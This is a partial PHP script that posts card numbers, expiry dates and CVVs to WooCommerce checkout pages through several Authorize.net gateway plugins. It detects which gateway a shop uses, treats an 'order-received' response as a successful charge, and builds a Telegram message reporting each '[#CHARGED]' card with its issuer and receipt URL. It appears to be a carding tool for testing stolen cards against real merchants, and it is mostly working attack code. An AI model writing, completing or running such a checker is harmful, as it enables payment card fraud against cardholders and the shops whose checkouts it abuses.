...
# ---------------- [ WC AJAX ] --------- #
$paymentMethods = [
    // 'nmi_gateway_woocommerce_credit_card' => '/<input[^>]*name="payment_method"[^>]*value="nmi_gateway_woocommerce_credit_card"/',
    'authorizeaim' => '/<input[^>]*name="payment_method"[^>]*value="authorizeaim"/',
    'yith_wcauthnet_credit_card_gateway' => '/<input[^>]*name="payment_method"[^>]*value="yith_wcauthnet_credit_card_gateway"/',
    'eh_authorize_net_aim_card' => '/<input[^>]*name="payment_method"[^>]*value="eh_authorize_net_aim_card"/',
    'authorize_net_cim_credit_card' => '/<input[^>]*name="payment_method"[^>]*value="authorize_net_cim_credit_card"/',
    'authorize_net_aim' => '/<input[^>]*name="payment_method"[^>]*value="authorize_net_aim"/'
    ];
...
///sd/sssssssssssssssssssssssssssssssssssssssssssssssssssssss//
$ch = curl_init();
...
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
  ...
  //  "account_password" => 'rdrdnt3n43n4323',
    'shipping_first_name' => '',
    'shipping_last_name' => '',
    'shipping_company' => '',
    'shipping_country' => '',
    ...
    //AUTHAIM
    'authorizeaim-card-number' => $cc,
    'authorizeaim-card-expiry' => $mes_with_zero . ' / ' . $ano_no_20,
    'authorizeaim-card-cvc' =>  $cvv,


    //AUTHNETAIM
    'wc-authorize-net-aim-payment-descriptor' => 'COMMON.ACCEPT.INAPP.PAYMENT',
    'wc-authorize-net-cim-credit-card-last-four' => $cc4,
    'wc-authorize-net-aim-card-type' => $brand,
    'wc-authorize-net-aim-account-number' => $cc,
    'wc-authorize-net-aim-expiry' => $mes . ' / ' . $ano,
    'wc-authorize-net-aim-csc' => $cvv,
    'wc-authorize-net-aim-payment-descriptor' => 'COMMON.ACCEPT.INAPP.PAYMENT',
    'wc-authorize-net-aim-last-four' => $cc4,
    'wc-authorize-net-aim-card-type' => $brand,

    //AUTHNETCIM_CC
    'wc-authorize-net-cim-credit-card-payment-nonce' => $datavalue,
    ...
    'wc-authorize-net-aim-credit-card-account-number' => $cc,
    'wc-authorize-net-cim-credit-card-expiry' => $mes . ' / ' . $ano,

    //EHAUTHORIZE
    'eh_authorize_net_aim_card_card_number' => $cc,
    'eh_authorize_net_aim_card_card_expiry' => $mes_with_zero . ' / ' . $ano_no_20,
    'eh_authorize_net_aim_card_card_cvc' =>  $cvv,
    
    //YITHAUTNETH
    'yith_wcauthnet_credit_card_gateway-card-number' => $cc,
    'yith_wcauthnet_credit_card_gateway-card-expiry' => $mes_with_zero . ' / ' . $ano_no_20,
...
if ($isoCountry !== 'Not found') {
 ...
 if (strpos($Payment, '"result":"success","redirect"') !== false && strpos($Payment, 'order-received') !== false) { 
    ...
    <span style="color: #15b823ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
            ...
            $telegramMessage = "[#CHARGED]-$lista ['.$selectedPaymentMethod.']
           \n[$hostname1]
           \n[$receiptUrl]\n";
